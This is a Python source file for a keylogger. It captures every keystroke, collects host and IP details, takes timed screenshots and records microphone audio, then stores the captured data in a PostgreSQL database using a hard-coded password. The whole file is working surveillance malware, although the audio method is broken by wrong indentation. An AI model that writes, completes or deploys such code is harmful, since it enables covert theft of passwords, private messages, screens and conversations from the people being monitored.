import base64
import io
import zipfile
import logging
import psycopg2
import wave
import socket
import platform
import sounddevice as sd
import pyscreenshot as screenshot
import threading
import pynput.keyboard
import time
import platform
import datetime
import pyaes

class KeyLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.log = "KeyLogger Started..."

    def appendlog(self, string):
        self.log = self.log + string

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(f"\nHostname: {hostname}\nIP Address: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n")

    def microphone(self, SEND_REPORT_EVERY):
      fs = 44100  # Define fs as the sampling rate
    seconds = SEND_REPORT_EVERY
    obj = wave.open('sound.wav', 'w')
    obj.setnchannels(1)  # mono
    obj.setsampwidth(2)
    obj.setframerate(fs)  # Use fs as the sampling rate
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()
    obj.writeframes(myrecording.tobytes())
    obj.close()


        
    def screenshot(self):
        img = screenshot.grab()
        # Convert the image to bytes
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        # Now you can send img_bytes to the database or perform any other desired operations
        self.send_to_database(img_bytes)

    def send_to_database(self, img_bytes):
        conn = None  # Define conn variable before try-except block
        cursor = None
        try:
            conn = psycopg2.connect(
                dbname="logs",
                user="postgres",
                password="mombasa@2023",
                host="localhost",
                port=5432  # Replace with the actual port number
            )
            cursor = conn.cursor()

            # Reset the file pointer to the beginning of img_bytes
            img_bytes.seek(0)

            # Insert log message into the database
            cursor.execute("INSERT INTO logs (timestamp, message, screenshot) VALUES (%s, %s, %s)", (datetime.datetime.now(), self.log, psycopg2.Binary(img_bytes.read())))
            conn.commit()

        except (Exception, psycopg2.Error) as error:
            print("Error while connecting to PostgreSQL:", error)

        finally:
            # Close database connection
            if cursor:
                cursor.close()
            if conn:
                conn.close()
                
    def run(self):
        self.system_information()
        threading.Thread(target=self.capture_screenshots).start()
        self.capture_keystrokes()

    def capture_screenshots(self):
        while True:
            self.screenshot()
            time.sleep(self.interval)

    def capture_keystrokes(self):
        def on_press(key):
            try:
                self.appendlog(str(key.char))
            except AttributeError:
                self.appendlog(' [' + str(key) + '] ')
        
        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()

SEND_REPORT_EVERY = 60  # in seconds

keylogger = KeyLogger(SEND_REPORT_EVERY)
keylogger.run()
